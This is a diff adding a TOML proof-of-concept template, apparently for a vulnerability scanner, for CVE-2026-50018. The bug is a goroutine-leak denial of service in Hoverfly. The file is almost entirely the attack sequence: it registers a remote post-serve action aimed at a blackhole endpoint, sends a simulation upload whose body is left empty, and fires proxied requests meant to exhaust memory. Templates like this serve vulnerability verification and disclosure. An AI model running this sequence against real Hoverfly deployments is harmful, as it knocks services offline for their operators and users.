@@ -1,0 +1,119 @@
+[info]
+author = "ave"
+description = "验证 Hoverfly 远程后置动作 Goroutine 泄漏导致的 DoS 漏洞。通过注册指向黑洞端点的远程后置动作，配置全匹配模拟，发送代理请求触发 Goroutine 泄漏导致内存耗尽。"
+id = "POC-AVE-2026-0335"
+name = "CVE-2026-50018 PoC"
+severity = "medium"
+tags = ["ave-2026-0335"]
+vuln_id = [
+    "CVE-2026-50018",
+    "AVE-2026-0335",
+    "GHSA-42j2-w334-qxw7",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/api/v2/hoverfly/post-serve-action"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"actionName": "leak", "remote": "http://192.0.2.1:9999/blackhole", "delayInMs": 0}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+]
+type = "status"
+
+[[poc.requests]]
+method = "PUT"
+path = "/api/v2/simulation"
+protocol = "http"
+
+[poc.requests.body]
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/test-poc-1"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "target.com"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/test-poc-2"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "target.com"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/test-poc-3"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "target.com"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/test-poc-4"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "target.com"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/test-poc-5"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "target.com"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
